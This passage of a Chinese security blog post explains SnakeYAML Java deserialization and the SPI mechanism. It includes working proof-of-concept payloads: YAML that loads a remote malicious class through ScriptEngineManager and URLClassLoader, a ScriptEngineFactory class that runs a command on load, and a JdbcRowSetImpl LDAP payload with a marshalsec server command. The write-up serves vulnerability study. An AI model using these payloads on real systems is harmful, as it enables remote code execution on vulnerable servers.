a;</span><br><span class="line">        <span class="built_in">this</span>.b = b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以见到，有构造方法，我们可以使用这种办法去进行反序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.TestB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ModelBTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        <span class="type">ModelB</span> <span class="variable">b</span> <span class="operator">=</span> (ModelB) yaml.load(<span class="string">&quot;!!com.TestB.ModelB [5, 0 ]&quot;</span>);</span><br><span class="line">        System.out.println(yaml.dump(b));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看的出来[]是调用构造函数的一个标志，在构造函数中下断点，也能够成功调到。</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220415141958.png"></p><p>​            需要注意 snakeyaml 反序列化时，如果类中的成员变量全为私有将会失败（调试得知）</p><ol start="3"><li><p>调用<code>setXX</code>函数</p><p>先声明如下C类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.TestC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ModelC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> a;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> b;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setA</span><span class="params">(<span class="type">int</span> a)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.a = a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setB</span><span class="params">(<span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.b = b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用如下方式进行序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.TestC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ModelCTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        <span class="type">ModelC</span> <span class="variable">c</span> <span class="operator">=</span> (ModelC) yaml.load(<span class="string">&quot;!!com.TestC.ModelC &#123;a : 5, b : 10&#125;&quot;</span>);</span><br><span class="line">        System.out.println(yaml.dump(c));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>可以看到调用set函数的方式和无构造函数的方式写法差不多，比如要调用setA函数，把set去掉将后面单词全部小写后，</p><p>就是a ，然后用 花括号进行一个赋值。</p><p>到此为止，意味着snakeyaml 可以利用fastjson和Jackson的所有利用链（反之不一定行），并且还没有autotype的限制。不过fastjson和jackson好像也没有直接RCE的链，并且还多依赖于三方jar包，通过改写1.2.68 写文件的链和ScriptManager本地加载jar包的方式 仅需依赖jdk就可以完成RCE。</p><h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>SnakeYaml全版本都可被反序列化漏洞利用</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>按照如上所述，因为SnakeYaml支持反序列化Java对象，所以当Yaml.load()函数的参数外部可控时，攻击者就可以传入一个恶意类的yaml格式序列化内容，当服务端进行yaml反序列化获取恶意类时就会触发SnakeYaml反序列化漏洞。所以我们可以参考fastsjon编写如下demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calcTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">context</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  !!java.net.URLClassLoader [[\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    !!java.net.URL [\&quot;http://teou2u.dnslog.cn\n\n\n\&quot;]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  ]]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>切记在DNSlog前面加上HTTP标头</p></blockquote><p>如上，和fastjson检测能否使用DNSlog是一样的。</p><h2 id="漏洞利用-ScriptEngineManager利用链"><a href="#漏洞利用-ScriptEngineManager利用链" class="headerlink" title="漏洞利用(ScriptEngineManager利用链)"></a>漏洞利用(ScriptEngineManager利用链)</h2><p>能和fastjson一样控制的话，思路可以是使用类加载器，进行远程恶意类的加载，然后进行一个利用。</p><p>师傅们这里的常规的Gadget是使用的<code>ScriptEngineFactory</code>的链子：</p><p>如果<strong>攻击者可以根据接口类写恶意的实现类</strong>，并且能通过<strong>控制Jar包中META-INF&#x2F;services目录中的SPI配置文件</strong>，就会导致服务器端在通过SPI机制时调用攻击者写的恶意实现类导致任意代码执行。</p><p>如下所示，编写payload的代码</p><p>&#x3D;&#x3D;注意编写的 payload 中不要有任何的包名，直接从import开始进行&#x3D;&#x3D;</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> <span class="keyword">implements</span> <span class="title class_">ScriptEngineFactory</span> &#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;command execute&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEngineName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEngineVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getExtensions</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getMimeTypes</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getNames</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLanguageName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLanguageVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getParameter</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMethodCallSyntax</span><span class="params">(String obj, String m, String... args)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getOutputStatement</span><span class="params">(String toDisplay)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getProgram</span><span class="params">(String... statements)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ScriptEngine <span class="title function_">getScriptEngine</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后使用 <code>javac</code>进行编译为class文件，使用<code>python</code>启一个http服务，在目录下新建目录：<code>META-INF\services\javax.script.ScriptEngineFactory</code>文件，里面内容写上要执行的class文件的名字，这里我写了<code>test</code></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220420122550.png"></p><p>​    在此目录下开启HTTP服务</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220420122715.png"></p><p>然后将访问路径控制根路径：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calcTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">context</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  !!java.net.URLClassLoader [[\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    !!java.net.URL [\&quot;http://127.0.0.1:8000/\&quot;]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  ]]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>命令成功执行</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220420122829.png"></p><p>同时，也可以打包成<code>jar</code>包放置在第三方服务器进行利用</p><h3 id="SPI机制分析"><a href="#SPI机制分析" class="headerlink" title="SPI机制分析"></a>SPI机制分析</h3><p>这里和之前的JNDI类似，都是远程开一个公网服务器，然后进行远程的类加载。但是，这个奇怪的文件：<code>META-INF\services\javax.script.ScriptEngineFactory</code>是什么呢？</p><p>Java SPI（Service Provider Interface）是JDK内置的一种服务提供发现机制，从JDK 6被引入。它可以动态地为某个接口寻找服务实现，有点类似 IOC(Inversion of Control)控制反转的思想，将装配的控制权移到程序之外，在模块化设计中这个机制尤其重要。使用 SPI 机制需要在Java classpath 下的 <strong>META-INF&#x2F;services&#x2F;</strong> 目录里创建一个以服务<strong>接口</strong>命名的文件，这个文件里的内容就是这个接口的具体的<strong>实现类</strong>。</p><blockquote><p>SPI机制就是，服务端提供接口类和寻找服务的功能，客户端用户这边根据服务端提供的接口类来定义具体的实现类，然后服务端会在加载该实现类的时候去寻找该服务即META-INF&#x2F;services&#x2F;目录里的配置文件中指定的类。这就是SPI和传统的API的区别，API是服务端自己提供接口类并自己实现相应的类供客户端进行调用，而SPI则是提供接口类和服务寻找功能、具体的实现类由客户端实现并调用。</p></blockquote><p>如下图所示：服务器端继承了API，客户端去调用API</p><p>​                        客户端继承了SPI，而服务器去调用SPI</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220420141209.png"></p><p>常见的SPI有JDBC，日志接口，Spring，Spring Boot相关starter组件，Dubbo，JNDI等</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220420141340.png"></p><p>使用介绍：</p><ol><li>当服务提供者提供了接口的一种具体实现后，在jar包的<code>META-INF/services</code>目录下创建一个以<strong>“包名 + 接口名”</strong>为命名的文件，内容为实现该接口的类的名称；</li><li>接口实现类所在的jar包放在主程序的classpath中。</li><li>主程序通过<code>java.util.ServiceLoder</code>动态装载实现模块，它通过在META-INF&#x2F;services目录下的配置文件找到实现类的类名，利用反射动态把类加载到JVM；</li></ol><p>下面做一个SPI的例子</p><h4 id="SPI-例子"><a href="#SPI-例子" class="headerlink" title="SPI 例子"></a>SPI 例子</h4><p>新建一个项目</p><p>创建好每个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">sayHello</span> <span class="keyword">implements</span> <span class="title class_">saying</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">say</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">sayHi</span> <span class="keyword">implements</span> <span class="title class_">saying</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">say</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hi&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">saying</span> &#123;</span><br><span class="line">    String <span class="title function_">say</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后创建配置文件，加入上面创建类的全限定类名</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220420150210.png"></p><p>在IDEA里将这个工程打包成jar文件</p><p>&#x3D;&#x3D;File &gt;&gt; Project Structure &gt;&gt; Artifacts &gt;&gt; + &gt;&gt; JAR &gt;&gt; From modules with dependencies&#x3D;&#x3D;</p><p>之后，在build中点击<code>build Artifacts</code></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220420151058.png"></p><p>在<code>out</code>文件夹下会获得 <code>jar</code>文件，这时候复制出来,将其添加为 library</p><blockquote><p>这里踩了个坑，一开始打包jar的时候，使用的maven项目，但是自定义的META-INF死活打包不上，后来换了普通的java项目就可以。具体的话，可以参考此链接看一看，：</p><p><a href="https://www.jianshu.com/p/0e22cdc53ebb">https://www.jianshu.com/p/0e22cdc53ebb</a></p></blockquote><p>开始新建一个项目，开始编写如下demo，然后进行测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.test.saying;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.ServiceLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestSPI</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ServiceLoader&lt;saying&gt; s = ServiceLoader.load(saying.class);</span><br><span class="line">        Iterator&lt;saying&gt; iterator = s.iterator();</span><br><span class="line">        <span class="keyword">while</span>(iterator.hasNext())&#123;</span><br><span class="line">            <span class="type">saying</span> <span class="variable">sy</span> <span class="operator">=</span> iterator.next();</span><br><span class="line">            System.out.println(sy.say());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用迭代器迭代后，可以循环遍历结果进行输出</p><p>结果如下回显：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220421124812.png"></p><p>从上述代码中可以看到，基本操作流程大概是：</p><ol><li>使用<code>ServiceLoader</code>加载要传入的接口类</li><li>使用迭代器遍历<code>META-INF/services</code>目录下的以该类命名的文件中的所有类，并实例化返回。</li></ol><p>关于更多SPI的东西，师傅们可以看这篇文章：</p><p><a href="https://www.pdai.tech/md/java/advanced/java-advanced-spi.html">https://www.pdai.tech/md/java/advanced/java-advanced-spi.html</a></p><h3 id="漏洞调试"><a href="#漏洞调试" class="headerlink" title="漏洞调试"></a>漏洞调试</h3><p>在<code>yaml.load</code>处打上断点</p><p>跟进<code>loadFromReader</code></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220421140139.png"></p><p>跟进<code>getSingleData</code>函数，到<code>constructDocument</code></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220421140451.png"></p><p>继续到<code>constructObject</code>函数，会到<code>constructObjectNoCheck</code>函数，</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220421141026.png"></p><p>然后，跟进<code>Construtor.construct</code>方法</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220421141156.png"></p><p>在<code>construct</code>方法里面一直走下去，会走到如下：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220421142115.png"></p><p>这时，根据反射获取的<code>c</code>类，获取信息，可以看到，反射类使用<code>SPI</code>进行连接</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220421142440.png"></p><p>最后在<code>aggumentList</code>中，可以获取参数，进行传递</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220421142851.png"></p><p>接下来就是需要理解，为什么会使用<code>SPI</code>的机制去进行解析呢？</p><p>现在进入<code>ScriptEngineManager</code>类中，静态看一下</p><p>根据<code>init</code>方法，往下走</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220421153821.png"></p><p>之后，会返回一个<code>loader</code></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220421153949.png"></p><p>此<code>loader</code>和<code>SPI</code>机制的demo一样，是调用<code>getServiceLoader</code>去动态加载类</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220421160040.png"></p><p>稍微看一下，就会发现，定义了一个<code>META-INF</code>的路径</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220421160309.png"></p><p>然后从这个目录下加载文件(与上面SPI遍历类似)</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220421160456.png"></p><h2 id="其他链子"><a href="#其他链子" class="headerlink" title="其他链子"></a>其他链子</h2><p>因为感觉和fastjson类似，所以可以参考一些它的链子</p><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!com.sun.rowset.JdbcRowSetImpl\n dataSourceName: \&quot;ldap://localhost:1389/test\&quot;\n autoCommit: true&quot;</span>;</span><br></pre></td></tr></table></figure><p>当然还需搭建LDAP服务和恶意类Exploit。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java <span class="literal">-cp</span> marshalsec.jar marshalsec.jndi.LDAPRefServer http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8000</span>/<span class="comment">#test 1389</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220421162308.png"></p><p>运行即可触发：</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220421162122.png"></p><p>可以看到放置在<code>8000</code>端口下的恶意类被进行访问</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220421162405.png"></p><h3 id="Spring-PropertyPathFactoryBean"><a href="#Spring-PropertyPathFactoryBean" class="headerlink" title="Spring PropertyPathFactoryBean"></a>Spring PropertyPathFactoryBean</h3><p>​    需要在目标环境存在springframework相关的jar包。根据师傅们的文章，先导入一下依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span 